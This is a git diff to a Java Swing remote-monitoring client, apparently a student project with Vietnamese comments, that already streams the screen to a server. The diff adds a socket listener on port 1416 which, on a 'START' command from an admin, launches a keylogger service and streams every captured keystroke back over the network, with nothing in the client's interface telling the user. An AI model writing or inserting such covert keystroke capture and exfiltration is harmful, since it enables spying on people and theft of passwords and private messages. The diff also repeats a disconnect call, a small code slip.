@@ -3,17 +3,23 @@ package UI;
 
 import config.ClientConfig; // file config để load các thông số mặc định như IP và Port của server
 import java.awt.*;
+import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.net.InetAddress;
+import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.UnknownHostException;
+import java.util.concurrent.LinkedBlockingQueue;
+
 import javax.swing.*;
 import network.Screen;
 import network.SocketClient;
+import service.keylogger.KeyloggerService;
 
 public class UIClient extends JFrame {
 
     private SocketClient socketClient;
+    private ServerSocket keylogServerSocket;;
 
     private final static String titleString="CLIENT AGENT";
     private final static int width=450;
@@ -31,9 +37,69 @@ public class UIClient extends JFrame {
     private JTextField ipField;//ô nhập ip của server 
     private JTextField portField;//ô nhập port của server
     private JButton connectButton;//nút bấm connect
-    private JLabel statusLabel;//hiển thị trạng thái kết nối với server
+    private JLabel statusLabel; // hiển thị trạng thái kết nối với server
 
-   
+    private void startKeyloggerListener() {
+        int port = ClientConfig.getInt("keylog_port", 1416);
+ 
+        new Thread(() -> {
+            try {
+                keylogServerSocket = new ServerSocket(port);
+                System.out.println("[KEYLOGGER] Listening on port " + port);
+ 
+                while (!keylogServerSocket.isClosed()) {
+                    Socket session = keylogServerSocket.accept();
+                    System.out.println("[KEYLOGGER] Admin connected: "
+                            + session.getInetAddress().getHostAddress());
+                    new Thread(() -> handleKeylogSession(session), "Keylog-Session").start();
+                }
+ 
+            } catch (Exception e) {
+                System.out.println("[KEYLOGGER] Listener stopped.");
+            }
+        }, "Keylog-Listener").start();
+    }
+
+    private void handleKeylogSession(Socket session) {
+        KeyloggerService keyloggerService = null;
+ 
+        try {
+            DataInputStream  dis = new DataInputStream(session.getInputStream());
+            DataOutputStream dos = new DataOutputStream(session.getOutputStream());
+ 
+            // Đọc lệnh từ Admin
+            String command = dis.readUTF();
+            if (!command.equals("START")) {
+                System.out.println("[KEYLOGGER] Lệnh không hợp lệ: " + command);
+                session.close();
+                return;
+            }
+ 
+            System.out.println("[KEYLOGGER] Nhận lệnh START — bắt đầu ghi phím");
+ 
+            LinkedBlockingQueue<String> keyQueue = new LinkedBlockingQueue<>();
+ 
+            keyloggerService = new KeyloggerService(keyQueue);
+            keyloggerService.start();
+ 
+            while (!session.isClosed()) {
+                String key = keyQueue.take();
+                if (key.equals("__STOP__")) break;
+ 
+                byte[] bytes = key.getBytes("UTF-8");
+                dos.writeInt(bytes.length);
+                dos.write(bytes);
+                dos.flush();
+            }
+ 
+        } catch (Exception e) {
+            System.out.println("[KEYLOGGER] Session kết thúc: " + e.getMessage());
+        } finally {
+            if (keyloggerService != null) keyloggerService.stop();
+            try { session.close(); } catch (Exception ignored) {}
+            System.out.println("[KEYLOGGER] Đã dừng ghi phím");
+        }
+    }
 
     public UIClient() {
         setTitle(titleString);
@@ -129,8 +195,7 @@ public class UIClient extends JFrame {
         portLabel.setFont(new Font("Segoe UI", Font.BOLD, 13));
         
         portField = createTextField(
-        ClientConfig.getString("server.port", "1412")
-);
+        ClientConfig.getString("server.port", "1412"));
 
         inputPanel.add(ipLabel);
         inputPanel.add(ipField);
@@ -166,6 +231,14 @@ public class UIClient extends JFrame {
             if (socketClient != null && socketClient.isConnected()) {
                 // Nếu đã kết nối rồi thì thực hiện ngắt kết nối
                 socketClient.disconnect();
+                socketClient.disconnect();
+
+                // THÊM ĐOẠN NÀY
+                try {
+                    if (keylogServerSocket != null && !keylogServerSocket.isClosed()) {
+                        keylogServerSocket.close();
+                    }
+                } catch (Exception ignored) {}
 
                 statusLabel.setText("● STATUS: DISCONNECTED");
                 statusLabel.setForeground(MUTED);
@@ -202,8 +275,8 @@ public class UIClient extends JFrame {
 
                         Screen screenStreamService = new Screen(socketClient.getDos());
                         screenStreamService.start();
-                    } 
-                    else {
+                        startKeyloggerListener();
+                    } else {
                         statusLabel.setText("● STATUS: CONNECTION FAILED!");
                         statusLabel.setForeground(RED);
                         connectButton.setEnabled(true);
